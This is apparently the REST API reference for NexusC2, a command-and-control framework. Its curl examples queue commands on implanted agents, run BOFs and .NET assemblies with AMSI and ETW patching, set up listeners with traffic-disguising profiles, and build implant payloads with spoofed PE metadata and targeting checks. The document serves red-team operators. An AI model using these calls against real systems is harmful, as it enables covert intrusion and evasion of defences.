# NexusC2 REST API Reference

Complete endpoint reference for the NexusC2 REST API. All endpoints communicate over HTTPS on port **8443**.

**Base URL:** `https://<server>:8443`

> All `curl` examples use `-k` to skip TLS certificate verification. In production, use `--cacert /path/to/ca.crt` instead.

---

## Table of Contents

- [Authentication](#authentication)
  - [POST /api/v1/auth/login](#post-apiv1authlogin)
  - [POST /api/v1/auth/cert-login](#post-apiv1authcert-login)
  - [POST /api/v1/auth/refresh](#post-apiv1authrefresh)
  - [POST /api/v1/auth/logout](#post-apiv1authlogout)
  - [GET /api/v1/auth/me](#get-apiv1authme)
- [Agents](#agents)
  - [GET /api/v1/agents](#get-apiv1agents)
  - [GET /api/v1/agents/:id](#get-apiv1agentsid)
  - [PATCH /api/v1/agents/:id](#patch-apiv1agentsid)
  - [DELETE /api/v1/agents/:id](#delete-apiv1agentsid)
  - [POST /api/v1/agents/:id/tags](#post-apiv1agentsidtags)
  - [DELETE /api/v1/agents/:id/tags/:tag](#delete-apiv1agentsidtagstag)
- [Commands](#commands)
  - [POST /api/v1/agents/:id/commands](#post-apiv1agentsidcommands)
  - [GET /api/v1/agents/:id/commands](#get-apiv1agentsidcommands)
  - [GET /api/v1/agents/:id/commands/latest](#get-apiv1agentsidcommandslatest)
  - [GET /api/v1/commands/:id](#get-apiv1commandsid)
  - [DELETE /api/v1/agents/:id/commands/queue](#delete-apiv1agentsidcommandsqueue)
- [BOF & Assembly Execution](#bof--assembly-execution)
  - [POST /api/v1/agents/:id/bof](#post-apiv1agentsidbof)
  - [POST /api/v1/agents/:id/assembly](#post-apiv1agentsidassembly)
- [Listeners](#listeners)
  - [GET /api/v1/listeners](#get-apiv1listeners)
  - [GET /api/v1/listeners/:name](#get-apiv1listenersname)
  - [POST /api/v1/listeners](#post-apiv1listeners)
  - [DELETE /api/v1/listeners/:name](#delete-apiv1listenersname)
- [Payloads](#payloads)
  - [POST /api/v1/payloads/build](#post-apiv1payloadsbuild)
- [Profiles](#profiles)
  - [GET /api/v1/profiles](#get-apiv1profiles)
  - [GET /api/v1/profiles/names](#get-apiv1profilesnames)
  - [GET /api/v1/profiles/template](#get-apiv1profilestemplate)
  - [POST /api/v1/profiles/upload](#post-apiv1profilesupload)
  - [GET /api/v1/profiles/get](#get-apiv1profilesget)
  - [GET /api/v1/profiles/get/:name](#get-apiv1profilesgetname)
  - [DELETE /api/v1/profiles/get/:name](#delete-apiv1profilesgetname)
  - [GET /api/v1/profiles/post](#get-apiv1profilespost)
  - [GET /api/v1/profiles/post/:name](#get-apiv1profilespostname)
  - [DELETE /api/v1/profiles/post/:name](#delete-apiv1profilespostname)
  - [GET /api/v1/profiles/server-response](#get-apiv1profilesserver-response)
  - [GET /api/v1/profiles/server-response/:name](#get-apiv1profilesserver-responsename)
  - [DELETE /api/v1/profiles/server-response/:name](#delete-apiv1profilesserver-responsename)
  - [GET /api/v1/profiles/variants](#get-apiv1profilesvariants)
  - [GET /api/v1/profiles/variants/:name](#get-apiv1profilesvariantsname)
- [Events (SSE)](#events-sse)
  - [GET /api/v1/events](#get-apiv1events)
- [Health](#health)
  - [GET /health](#get-health)
- [Error Responses](#error-responses)
- [Rate Limiting](#rate-limiting)

---

## Endpoint Categories

| Category | Description | Details |
|----------|-------------|---------|
| [Agents](API-AGENTS.md) | List, manage, and interact with connected agents | Tags, aliases, pagination |
| [Commands](API-COMMANDS.md) | Send commands and retrieve results | History, queue, outputs |
| [Listeners](API-LISTENERS.md) | Create and manage network listeners | HTTP/HTTPS/SMB/TCP protocols |
| [Profiles](API-PROFILES.md) | Malleable profile management | GET/POST/Response/SMB/TCP/Variants |
| [Payloads](API-PAYLOADS.md) | Build agent payloads | Multi-OS, safety checks, variants |
| [Events](API-EVENTS.md) | Real-time SSE stream, health checks | Live agent/command updates |

---

## Authentication

All protected endpoints require a Bearer token in the `Authorization` header:

```
Authorization: Bearer <access_token>
```

Token lifecycle:
1. **Login** → receive `access_token` (1h) and `refresh_token` (24h)
2. Use `access_token` in the `Authorization` header for all requests
3. **Refresh** before the access token expires
4. **Logout** to invalidate the refresh token

---

### POST /api/v1/auth/login

Authenticate with username and password. Supports both the shared API password and per-user passwords.

| Field | Type | Required | Description |
|-------|------|----------|-------------|
| `username` | string | **Yes** | Operator username |
| `password` | string | **Yes** | Shared API password or user-specific password |

```bash
curl -sk -X POST https://localhost:8443/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"YOUR_API_PASSWORD"}'
```

**Response (200):**
```json
{
  "access_token": "eyJhbGciOiJIUzI1NiIs...",
  "refresh_token": "a1b2c3d4e5f6...",
  "expires_in": 3600,
  "token_type": "Bearer",
  "username": "admin"
}
```

**Errors:** `400` invalid body, `401` bad credentials, `403` account inactive

---

### POST /api/v1/auth/cert-login

Authenticate using a TLS client certificate. The certificate CN or first SAN must match the requested username. Users are auto-provisioned on first login.

| Field | Type | Required | Description |
|-------|------|----------|-------------|
| `username` | string | **Yes** | Must match the client certificate identity |

```bash
curl -sk -X POST https://localhost:8443/api/v1/auth/cert-login \
  --cert client.crt --key client.key \
  -H "Content-Type: application/json" \
  -d '{"username":"operator1"}'
```

**Response (200):** Same as `/auth/login`.

**Errors:** `401` no client certificate, `400` missing username, `403` cert identity mismatch

---

### POST /api/v1/auth/refresh

Exchange a valid refresh token for a new token pair. The old refresh token is invalidated.

| Field | Type | Required | Description |
|-------|------|----------|-------------|
| `refresh_token` | string | **Yes** | Current refresh token |

```bash
curl -sk -X POST https://localhost:8443/api/v1/auth/refresh \
  -H "Content-Type: application/json" \
  -d '{"refresh_token":"a1b2c3d4e5f6..."}'
```

**Response (200):** Same shape as `/auth/login`.

**Errors:** `401` invalid/expired token, `403` account inactive

---

### POST /api/v1/auth/logout

Invalidate a refresh token. **Requires authentication.**

| Field | Type | Required | Description |
|-------|------|----------|-------------|
| `refresh_token` | string | **Yes** | Refresh token to invalidate |

```bash
curl -sk -X POST https://localhost:8443/api/v1/auth/logout \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"refresh_token":"a1b2c3d4e5f6..."}'
```

**Response (200):**
```json
{"message": "logged out successfully"}
```

---

### GET /api/v1/auth/me

Return the authenticated user's identity. **Requires authentication.**

```bash
curl -sk https://localhost:8443/api/v1/auth/me \
  -H "Authorization: Bearer $TOKEN"
```

**Response (200):**
```json
{
  "user_id": "550e8400-e29b-41d4-a716-446655440000",
  "username": "admin"
}
```

---

## Agents

### GET /api/v1/agents

List all active agents with pagination.

| Parameter | Location | Type | Required | Default | Description |
|-----------|----------|------|----------|---------|-------------|
| `page` | query | int | No | `1` | Page number |
| `limit` | query | int | No | `50` | Results per page (max 100) |
| `include_deleted` | query | string | No | `"false"` | Set `"true"` to include soft-deleted agents |

```bash
curl -sk https://localhost:8443/api/v1/agents \
  -H "Authorization: Bearer $TOKEN"
```

```bash
# With pagination
curl -sk "https://localhost:8443/api/v1/agents?page=2&limit=10" \
  -H "Authorization: Bearer $TOKEN"
```

**Response (200):**
```json
{
  "agents": [
    {
      "id": "abc-123-def",
      "new_client_id": "abc-123-def",
      "client_id": "xyz-789",
      "protocol": "HTTPS",
      "ext_ip": "203.0.113.10",
      "int_ip": "10.0.0.5",
      "username": "CORP\\jsmith",
      "hostname": "WORKSTATION-01",
      "process": "svchost.exe",
      "pid": "4872",
      "arch": "amd64",
      "os": "windows",
      "last_seen": "2026-10-30T12:00:00Z",
      "alias": "dc-pivot",
      "tags": [{"name": "high-value", "color": "#E74C3C"}]
    }
  ],
  "pagination": {"page": 1, "limit": 50, "total": 3}
}
```

---

### GET /api/v1/agents/:id

Get a single agent by its GUID.

| Parameter | Location | Type | Required | Description |
|-----------|----------|------|----------|-------------|
| `id` | path | string | **Yes** | Agent GUID (`new_client_id`) |

```bash
curl -sk https://localhost:8443/api/v1/agents/abc-123-def \
  -H "Authorization: Bearer $TOKEN"
```

**Response (200):** Single agent object (same shape as list items).

**Errors:** `404` agent not found

---

### PATCH /api/v1/agents/:id

Update an agent's alias.

| Parameter | Location | Type | Required | Description |
|-----------|----------|------|----------|-------------|
| `id` | path | string | **Yes** | Agent GUID |

| Field | Type | Required | Description |
|-------|------|----------|-------------|
| `alias` | string | **Yes** | New alias (empty string clears it) |

```bash
curl -sk -X PATCH https://localhost:8443/api/v1/agents/abc-123-def \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"alias":"dc-pivot"}'
```

**Response (200):**
```json
{"message": "agent updated successfully"}
```

**Errors:** `400` invalid body, `404` agent not found

---

### DELETE /api/v1/agents/:id

Soft-delete an agent (sets `deleted_at` timestamp).

| Parameter | Location | Type | Required | Description |
|-----------|----------|------|----------|-------------|
| `id` | path | string | **Yes** | Agent GUID |

```bash
curl -sk -X DELETE https://localhost:8443/api/v1/agents/abc-123-def \
  -H "Authorization: Bearer $TOKEN"
```

**Response (200):**
```json
{"message": "agent deleted successfully"}
```

**Errors:** `404` agent not found

---

### POST /api/v1/agents/:id/tags

Add or update a tag on an agent. If the tag name already exists, the color is updated.

| Parameter | Location | Type | Required | Description |
|-----------|----------|------|----------|-------------|
| `id` | path | string | **Yes** | Agent GUID |

| Field | Type | Required | Default | Description |
|-------|------|----------|---------|-------------|
| `tag_name` | string | **Yes** | — | Tag name |
| `tag_color` | string | No | `#4A90E2` | Hex color code |

```bash
curl -sk -X POST https://localhost:8443/api/v1/agents/abc-123-def/tags \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"tag_name":"high-value","tag_color":"#E74C3C"}'
```

**Response (200):**
```json
{
  "message": "tag added successfully",
  "tags": [{"name": "high-value", "color": "#E74C3C"}]
}
```

---

### DELETE /api/v1/agents/:id/tags/:tag

Remove a tag from an agent.

| Parameter | Location | Type | Required | Description |
|-----------|----------|------|----------|-------------|
| `id` | path | string | **Yes** | Agent GUID |
| `tag` | path | string | **Yes** | Tag name to remove |

```bash
curl -sk -X DELETE https://localhost:8443/api/v1/agents/abc-123-def/tags/high-value \
  -H "Authorization: Bearer $TOKEN"
```

**Response (200):**
```json
{
  "message": "tag removed successfully",
  "tags": []
}
```

---

## Commands

### POST /api/v1/agents/:id/commands

Send a command to an agent. The command is queued and delivered on the agent's next check-in.

| Parameter | Location | Type | Required | Description |
|-----------|----------|------|----------|-------------|
| `id` | path | string | **Yes** | Agent GUID |

| Field | Type | Required | Description |
|-------|------|----------|-------------|
| `command` | string | **Yes** | Command to execute (e.g. `whoami`, `ps`, `shell ipconfig`) |
| `data` | string | No | Additional data payload |

```bash
curl -sk -X POST https://localhost:8443/api/v1/agents/abc-123-def/commands \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"command":"whoami"}'
```

**Response (200) — sent immediately:**
```json
{
  "command_id": "f47ac10b-58cc-4372-a567-0e02b2c3d479",
  "db_id": 42,
  "status": "sent",
  "timestamp": "2026-10-30T12:00:00Z"
}
```

**Response (202) — queued (agent offline):**
```json
{
  "command_id": "f47ac10b-...",
  "db_id": 42,
  "status": "queued",
  "message": "command queued, agent will receive on next check-in"
}
```

**Errors:** `400` invalid body, `404` agent not found

---

### GET /api/v1/agents/:id/commands

Get command history for an agent with pagination.

| Parameter | Location | Type | Required | Default | Description |
|-----------|----------|------|----------|---------|-------------|
| `id` | path | string | **Yes** | — | Agent GUID |
| `page` | query | int | No | `1` | Page number |
| `limit` | query | int | No | `50` | Results per page (max 100) |

```bash
curl -sk "https://localhost:8443/api/v1/agents/abc-123-def/commands?page=1&limit=20" \
  -H "Authorization: Bearer $TOKEN"
```

**Response (200):**
```json
{
  "commands": [
    {
      "id": 42,
      "username": "admin",
      "guid": "abc-123-def",
      "command": "whoami",
      "timestamp": "2026-10-30T12:00:00Z",
      "output": "CORP\\jsmith"
    }
  ],
  "pagination": {"page": 1, "limit": 20, "total": 5}
}
```

---

### GET /api/v1/agents/:id/commands/latest

Get the most recent command for an agent with its output and status.

| Parameter | Location | Type | Required | Description |
|-----------|----------|------|----------|-------------|
| `id` | path | string | **Yes** | Agent GUID |

```bash
curl -sk https://localhost:8443/api/v1/agents/abc-123-def/commands/latest \
  -H "Authorization: Bearer $TOKEN"
```

**Response (200):**
```json
{
  "command": {
    "id": 42,
    "username": "admin",
    "guid": "abc-123-def",
    "command": "whoami",
    "timestamp": "2026-10-30T12:00:00Z"
  },
  "outputs": [
    {"output": "CORP\\jsmith", "timestamp": "2026-10-30T12:00:05Z"}
  ],
  "has_output": true,
  "status": "completed"
}
```

**Errors:** `404` no commands found

---

### GET /api/v1/commands/:id

Get a specific command by its database ID, including all output chunks.

| Parameter | Location | Type | Required | Description |
|-----------|----------|------|----------|-------------|
| `id` | path | int | **Yes** | Command database ID |

```bash
curl -sk https://localhost:8443/api/v1/commands/42 \
  -H "Authorization: Bearer $TOKEN"
```

**Response (200):**
```json
{
  "command": {
    "id": 42,
    "username": "admin",
    "guid": "abc-123-def",
    "command": "whoami",
    "timestamp": "2026-10-30T12:00:00Z"
  },
  "outputs": [
    {"output": "CORP\\jsmith", "timestamp": "2026-10-30T12:00:05Z"}
  ]
}
```

**Errors:** `400` invalid ID, `404` command not found

---

### DELETE /api/v1/agents/:id/commands/queue

Clear the pending command queue for an agent.

| Parameter | Location | Type | Required | Description |
|-----------|----------|------|----------|-------------|
| `id` | path | string | **Yes** | Agent GUID |

```bash
curl -sk -X DELETE https://localhost:8443/api/v1/agents/abc-123-def/commands/queue \
  -H "Authorization: Bearer $TOKEN"
```

**Response (200):**
```json
{"message": "queue cleared"}
```

---

## BOF & Assembly Execution

### POST /api/v1/agents/:id/bof

Execute a Beacon Object File (BOF) on a Windows agent. Requires the WebSocket proxy to be configured.

| Parameter | Location | Type | Required | Description |
|-----------|----------|------|----------|-------------|
| `id` | path | string | **Yes** | Agent GUID |

| Field | Type | Required | Default | Description |
|-------|------|----------|---------|-------------|
| `data` | string | **Yes** | — | Base64-encoded BOF binary (.o file) |
| `arguments` | string[] | No | `[]` | Typed arguments (see format below) |
| `arguments_packed` | string | No | — | Pre-packed base64 argument buffer (overrides `arguments`) |
| `bof_name` | string | No | `"api-bof"` | Display name for the BOF |
| `arch` | string | No | `"x64"` | Target architecture: `"x64"` or `"x86"` |
| `async` | bool | No | `false` | Run asynchronously (non-blocking) |

**Argument format** for the `arguments` array — each string is `"-<type>:<value>"`:

| Type flag | Description | Example |
|-----------|-------------|---------|
| `-s` | ANSI string | `-s:hello` |
| `-w` | Wide (UTF-16) string | `-w:C:\Windows` |
| `-i` | 32-bit integer | `-i:1234` |
| `-I` | 64-bit integer | `-I:9999999999` |
| `-h` | 16-bit short | `-h:80` |
| `-z` | Raw base64 blob | `-z:AQIDBA==` |
| `-Z` | Base64 blob with size prefix | `-Z:AQIDBA==` |

```bash
BOF_B64=$(base64 -w0 whoami.x64.o)

curl -sk -X POST https://localhost:8443/api/v1/agents/abc-123-def/bof \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d "{
    \"data\": \"$BOF_B64\",
    \"bof_name\": \"whoami-bof\",
    \"arguments\": [\"-i:1\", \"-s:test\"],
    \"arch\": \"x64\"
  }"
```

**Response (200):**
```json
{
  "message": "command queued successfully",
  "agent_id": "abc-123-def",
  "command_id": "1698672000000000000",
  "command": "bof",
  "username": "admin",
  "timestamp": "2026-10-30T12:00:00Z",
  "status": "queued",
  "db_id": 43
}
```

**Errors:** `400` invalid base64 / bad arguments, `503` WebSocket proxy not configured

---

### POST /api/v1/agents/:id/assembly

Execute a .NET assembly (inline) on a Windows agent. Requires the WebSocket proxy to be configured.

| Parameter | Location | Type | Required | Description |
|-----------|----------|------|----------|-------------|
| `id` | path | string | **Yes** | Agent GUID |

| Field | Type | Required | Default | Description |
|-------|------|----------|---------|-------------|
| `data` | string | **Yes** | — | Base64-encoded .NET assembly (.exe/.dll) |
| `arguments` | string[] | No | `[]` | Command-line arguments passed to `Main()` |
| `app_domain` | string | No | `"InlineAssembly"` | .NET AppDomain name |
| `entry_point` | string | No | `"Main"` | Entry point method name |
| `disable_amsi` | bool | No | `false` | Patch AMSI before execution |
| `disable_etw` | bool | No | `false` | Patch ETW before execution |
| `revert_etw` | bool | No | `false` | Restore ETW patches after execution |
| `async` | bool | No | `false` | Run asynchronously |

```bash
ASM_B64=$(base64 -w0 Seatbelt.exe)

curl -sk -X POST https://localhost:8443/api/v1/agents/abc-123-def/assembly \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d "{
    \"data\": \"$ASM_B64\",
    \"arguments\": [\"--verbose\", \"--output\", \"results.txt\"],
    \"disable_amsi\": true,
    \"disable_etw\": true,
    \"revert_etw\": true
  }"
```

**Response (200):** Same shape as BOF response with `"command": "inline-assembly"`.

**Errors:** `400` invalid base64, `503` WebSocket proxy not configured

---

## Listeners

### GET /api/v1/listeners

List all configured listeners.

```bash
curl -sk https://localhost:8443/api/v1/listeners \
  -H "Authorization: Bearer $TOKEN"
```

**Response (200):**
```json
{
  "listeners": [
    {
      "id": "550e8400-e29b-41d4-a716-446655440000",
      "name": "https-main",
      "protocol": "HTTPS",
      "port": "443",
      "ip": "0.0.0.0",
      "get_profile": "default-get",
      "post_profile": "default-post",
      "server_response_profile": "default-response",
      "smb_profile": "",
      "tcp_profile": ""
    }
  ]
}
```

---

### GET /api/v1/listeners/:name

Get a single listener by name.

| Parameter | Location | Type | Required | Description |
|-----------|----------|------|----------|-------------|
| `name` | path | string | **Yes** | Listener name |

```bash
curl -sk https://localhost:8443/api/v1/listeners/https-main \
  -H "Authorization: Bearer $TOKEN"
```

**Response (200):** Single listener object.

**Errors:** `404` listener not found

---

### POST /api/v1/listeners

Create a new listener. HTTP/HTTPS listeners are started on the agent handler via gRPC. SMB and TCP are link-protocol listeners (no port binding on the server).

| Field | Type | Required | Default | Description |
|-------|------|----------|---------|-------------|
| `name` | string | **Yes** | — | Unique listener name |
| `protocol` | string | **Yes** | — | `"HTTP"`, `"HTTPS"`, `"SMB"`, `"TCP"`, or `"RPC"` |
| `port` | int | Conditional | — | Required for HTTP/HTTPS/TCP (1-65535). Ignored for SMB |
| `ip` | string | No | `"0.0.0.0"` | Bind address (HTTP/HTTPS only). Ignored for SMB/TCP |
| `pipe_name` | string | Conditional | — | Required for SMB listeners |
| `get_profile` | string | No | `"default-get"` | HTTP GET profile name |
| `post_profile` | string | No | `"default-post"` | HTTP POST profile name |
| `server_response` | string | No | `"default-response"` | Server response profile name |
| `smb_profile` | string | No | — | SMB communication profile |
| `tcp_profile` | string | No | — | TCP communication profile |

```bash
# HTTPS listener
curl -sk -X POST https://localhost:8443/api/v1/listeners \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "https-main",
    "protocol": "HTTPS",
    "port": 443
  }'
```

```bash
# HTTP listener with custom profiles
curl -sk -X POST https://localhost:8443/api/v1/listeners \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "http-8080",
    "protocol": "HTTP",
    "port": 8080,
    "ip": "0.0.0.0",
    "get_profile": "cdn-analytics-get",
    "post_profile": "cdn-analytics-post",
    "server_response": "cdn-analytics-response"
  }'
```

```bash
# SMB listener (requires pipe_name, no port)
curl -sk -X POST https://localhost:8443/api/v1/listeners \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "smb-pivot",
    "protocol": "SMB",
    "pipe_name": "spoolss"
  }'
```

```bash
# TCP listener (requires port, no IP)
curl -sk -X POST https://localhost:8443/api/v1/listeners \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "tcp-pivot",
    "protocol": "TCP",
    "port": 4444
  }'
```

**Response (201):**
```json
{
  "message": "listener created successfully",
  "listener": {
    "id": "550e8400-...",
    "name": "https-main",
    "protocol": "HTTPS",
    "port": "443",
    "ip": "0.0.0.0",
    "get_profile": "default-get",
    "post_profile": "default-post",
    "server_response_profile": "default-response"
  }
}
```

**Errors:** `400` invalid protocol/port, missing pipe_name for SMB, unknown profile name

---

### DELETE /api/v1/listeners/:name

Delete a listener by name. HTTP/HTTPS listeners are stopped via gRPC before removal.

| Parameter | Location | Type | Required | Description |
|-----------|----------|------|----------|-------------|
| `name` | path | string | **Yes** | Listener name |

```bash
curl -sk -X DELETE https://localhost:8443/api/v1/listeners/https-main \
  -H "Authorization: Bearer $TOKEN"
```

**Response (200):**
```json
{"message": "listener deleted successfully"}
```

**Errors:** `404` listener not found

---

## Payloads

### POST /api/v1/payloads/build

Build and download a compiled agent payload. The response is the raw binary (not JSON).

| Field | Type | Required | Default | Description |
|-------|------|----------|---------|-------------|
| `listener` | string | **Yes** | — | Listener name to callback to |
| `os` | string | **Yes** | — | `"windows"`, `"linux"`, or `"darwin"` |
| `arch` | string | **Yes** | — | `"amd64"` or `"arm64"` |
| `language` | string | No | `"go"` | Build language (`"go"` or `"goproject"` to export source) |
| `payload_type` | string | No | auto-detect | `"http"`, `"smb"`, or `"tcp"` (auto-detected from listener protocol) |
| `pipe_name` | string | Conditional | listener default | Named pipe (required if `payload_type="smb"`) |
| `smb_profile` | string | No | listener default | SMB communication profile name |
| `tcp_profile` | string | No | listener default | TCP communication profile name |
| `tcp_port` | string | No | listener port | TCP listen port for agent |
| `profile_variant` | string | No | — | Profile variant name (overrides listener profiles) |
| `pe_file_description` | string | No | — | Windows PE VERSIONINFO: FileDescription |
| `pe_company_name` | string | No | — | Windows PE VERSIONINFO: CompanyName |
| `pe_product_name` | string | No | — | Windows PE VERSIONINFO: ProductName |
| `pe_file_version` | string | No | — | Windows PE VERSIONINFO: FileVersion |
| `pe_product_version` | string | No | — | Windows PE VERSIONINFO: ProductVersion |
| `safety_checks` | object | No | — | Pre-execution safety checks (see below) |

**Safety checks object** (all fields optional):

| Field | Type | Description |
|-------|------|-------------|
| `hostname` | string | Only execute on this hostname |
| `username` | string | Only execute under this user |
| `domain` | string | Only execute in this domain |
| `process` | string | Only execute if this process is running |
| `kill_date` | string | Stop executing after this date (`YYYY-MM-DD` or RFC3339) |
| `file_check.path` | string | File path to check |
| `file_check.must_exist` | bool | `true` = file must exist, `false` = must not exist |
| `working_hours.start` | string | Start time (e.g. `"09:00"`) |
| `working_hours.end` | string | End time (e.g. `"17:00"`) |

```bash
# Basic HTTP payload
curl -sk -X POST https://localhost:8443/api/v1/payloads/build \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "listener": "https-main",
    "os": "windows",
    "arch": "amd64"
  }' -o payload.exe
```

```bash
# Linux payload with profile variant
curl -sk -X POST https://localhost:8443/api/v1/payloads/build \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "listener": "https-main",
    "os": "linux",
    "arch": "amd64",
    "profile_variant": "microsoft-graph"
  }' -o payload && chmod +x payload
```

```bash
# SMB payload
curl -sk -X POST https://localhost:8443/api/v1/payloads/build \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "listener": "https-main",
    "os": "windows",
    "arch": "amd64",
    "payload_type": "smb",
    "pipe_name": "spoolss"
  }' -o smb_payload.exe
```

```bash
# TCP payload
curl -sk -X POST https://localhost:8443/api/v1/payloads/build \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "listener": "https-main",
    "os": "linux",
    "arch": "amd64",
    "payload_type": "tcp",
    "tcp_port": "4444"
  }' -o tcp_payload && chmod +x tcp_payload
```

```bash
# With safety checks
curl -sk -X POST https://localhost:8443/api/v1/payloads/build \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "listener": "https-main",
    "os": "windows",
    "arch": "amd64",
    "safety_checks": {
      "hostname": "TARGET-DC",
      "domain": "corp.local",
      "kill_date": "2026-12-31",
      "working_hours": {"start": "09:00", "end": "17:00"}
    }
  }' -o payload.exe
```

**Response (200):** Raw binary with headers:
- `Content-Type: application/octet-stream`
- `Content-Disposition: attachment; filename="payload_linux_amd64"`
- `X-Build-Duration: 35.20s`

**Errors:** `400` invalid OS/arch/payload_type/variant, `404` listener not found, `500` build failure

---

## Profiles

### GET /api/v1/profiles

List all profiles (full objects). Includes GET, POST, server response, SMB, TCP profiles and variants.

```bash
curl -sk https://localhost:8443/api/v1/profiles \
  -H "Authorization: Bearer $TOKEN"
```

**Response (200):**
```json
{
  "get_profiles": [...],
  "post_profiles": [...],
  "server_response_profiles": [...],
  "smb_profiles": [...],
  "tcp_profiles": [...],
  "variants": [...]
}
```

---

### GET /api/v1/profiles/names

List profile names only (useful for populating dropdowns).

```bash
curl -sk https://localhost:8443/api/v1/profiles/names \
  -H "Authorization: Bearer $TOKEN"
```

**Response (200):**
```json
{
  "get_profiles": ["default-get", "cdn-analytics-get"],
  "post_profiles": ["default-post", "cdn-analytics-post"],
  "server_response_profiles": ["default-response", "cdn-analytics-response"],
  "smb_profiles": ["default-smb"],
  "tcp_profiles": ["default-tcp"],
  "variants": ["default", "cdn-analytics"]
}
```

---

### GET /api/v1/profiles/template

Download the TOML profile template file.

```bash
curl -sk https://localhost:8443/api/v1/profiles/template \
  -H "Authorization: Bearer $TOKEN" \
  -o listener_template.toml
```

**Response (200):** Raw TOML file with `Content-Type: application/toml`.

---

### POST /api/v1/profiles/upload

Upload new profiles via TOML content. Supports raw body or multipart file upload. Max body: 10MB.

**Option 1 — Raw TOML body:**
```bash
curl -sk -X POST https://localhost:8443/api/v1/profiles/upload \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/toml" \
  --data-binary @my_profiles.toml
```

**Option 2 — Multipart file upload:**
```bash
curl -sk -X POST https://localhost:8443/api/v1/profiles/upload \
  -H "Authorization: Bearer $TOKEN" \
  -F "profile=@my_profiles.toml"
```

**Response (200):**
```json
{
  "status": "success",
  "message": "Successfully added 3 profile(s)",
  "get_profiles_added": ["custom-get"],
  "post_profiles_added": ["custom-post"],
  "server_response_added": ["custom-response"],
  "smb_profiles_added": [],
  "tcp_profiles_added": [],
  "variants_added": [],
  "errors": []
}
```

**Status values:** `"success"` (all added), `"partial"` (some errors), or `400` (none added).

---

### GET /api/v1/profiles/get

List all GET profiles (full objects).

```bash
curl -sk https://localhost:8443/api/v1/profiles/get \
  -H "Authorization: Bearer $TOKEN"
```

---

### GET /api/v1/profiles/get/:name

Get a specific GET profile by name.

| Parameter | Location | Type | Required | Description |
|-----------|----------|------|----------|-------------|
| `name` | path | string | **Yes** | Profile name |

```bash
curl -sk https://localhost:8443/api/v1/profiles/get/default-get \
  -H "Authorization: Bearer $TOKEN"
```

**Errors:** `404` profile not found

---

### DELETE /api/v1/profiles/get/:name

Delete a GET profile by name.

```bash
curl -sk -X DELETE https://localhost:8443/api/v1/profiles/get/custom-get \
  -H "Authorization: Bearer $TOKEN"
```

**Response (200):**
```json
{"status": "success", "message": "GET profile deleted"}
```

**Errors:** `404` profile not found

---

### GET /api/v1/profiles/post

List all POST profiles (full objects).

```bash
curl -sk https://localhost:8443/api/v1/profiles/post \
  -H "Authorization: Bearer $TOKEN"
```

---

### GET /api/v1/profiles/post/:name

Get a specific POST profile by name.

```bash
curl -sk https://localhost:8443/api/v1/profiles/post/default-post \
  -H "Authorization: Bearer $TOKEN"
```

**Errors:** `404` profile not found

---

### DELETE /api/v1/profiles/post/:name

Delete a POST profile by name.

```bash
curl -sk -X DELETE https://localhost:8443/api/v1/profiles/post/custom-post \
  -H "Authorization: Bearer $TOKEN"
```

**Response (200):**
```json
{"status": "success", "message": "POST profile deleted"}
```

**Errors:** `404` profile not found

---

### GET /api/v1/profiles/server-response

List all server response profiles (full objects).

```bash
curl -sk https://localhost:8443/api/v1/profiles/server-response \
  -H "Authorization: Bearer $TOKEN"
```

---

### GET /api/v1/profiles/server-response/:name

Get a specific server response profile by name.

```bash
curl -sk https://localhost:8443/api/v1/profiles/server-response/default-response \
  -H "Authorization: Bearer $TOKEN"
```

**Errors:** `404` profile not found

---

### DELETE /api/v1/profiles/server-response/:name

Delete a server response profile by name.

```bash
curl -sk -X DELETE https://localhost:8443/api/v1/profiles/server-response/custom-response \
  -H "Authorization: Bearer $TOKEN"
```

**Response (200):**
```json
{"status": "success", "message": "Server response profile deleted"}
```

**Errors:** `404` profile not found

---

### GET /api/v1/profiles/variants

List all profile variants (full objects).

```bash
curl -sk https://localhost:8443/api/v1/profiles/variants \
  -H "Authorization: Bearer $TOKEN"
```

**Response (200):**
```json
{
  "variants": [
    {
      "name": "default",
      "get_profile": "default-get",
      "post_profile": "default-post",
      "server_response_profile": "default-response"
    },
    {
      "name": "cdn-analytics",
      "get_profile": "cdn-analytics-get",
      "post_profile": "cdn-analytics-post",
      "server_response_profile": "cdn-analytics-response"
    }
  ]
}
```

---

### GET /api/v1/profiles/variants/:name

Get a specific profile variant by name.

| Parameter | Location | Type | Required | Description |
|-----------|----------|------|----------|-------------|
| `name` | path | string | **Yes** | Variant name |

```bash
curl -sk https://localhost:8443/api/v1/profiles/variants/cdn-analytics \
  -H "Authorization: Bearer $TOKEN"
```

**Errors:** `404` variant not found

---

## Events (SSE)

### GET /api/v1/events

Subscribe to real-time Server-Sent Events. The connection stays open and streams events as they occur.

```bash
curl -sk -N https://localhost:8443/api/v1/events \
  -H "Authorization: Bearer $TOKEN"
```

Use `-N` (no buffering) with curl to see events in real time.

**Event types:**

| Event | Description |
|-------|-------------|
| `connected` | Initial connection acknowledgment |
| `heartbeat` | Keep-alive ping (every 30s) |
| `listener_update` | Listener created/deleted |
| `agent_update` | Agent status change |
| `command_output` | Command result received |

**Event format (standard SSE):**
```
event: listener_update
